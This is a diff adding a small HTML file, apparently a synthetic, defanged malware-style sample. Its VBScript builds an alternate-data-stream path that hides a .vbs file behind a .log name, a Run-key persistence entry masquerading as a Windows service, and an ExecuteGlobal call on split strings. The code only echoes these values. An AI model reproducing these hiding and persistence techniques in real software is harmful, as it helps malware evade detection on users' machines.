@@ -1,0 +1,17 @@
+<html>
+' generated-noise
+unused_generated = "AAAA"
+
+<head><title>cache</title></head>
+<body>
+<script type="text/v" & "bscript">
+Const adsPath = "%APPDATA%\Roaming\Microsoft\Windows\AppCache0287" & "32611605321388.log:AppCache028732611605321388.vbs"
+Const runKey = "HKCU\Software\Microsoft\Windows\C" & "urrentVersion\Run\dmwappushservice"
+launcher = Join(Array("wscript", " /B ", """", adsPath, """"), "")
+payload = "cloud = ""hxxps://cloud.example.i" & "nvalid/api"" : WScript.Echo cloud"
+ExecuteGlobal payload
+WScript.Echo launcher
+WScript.Echo runKey
+</script>
+</body>
+</html>
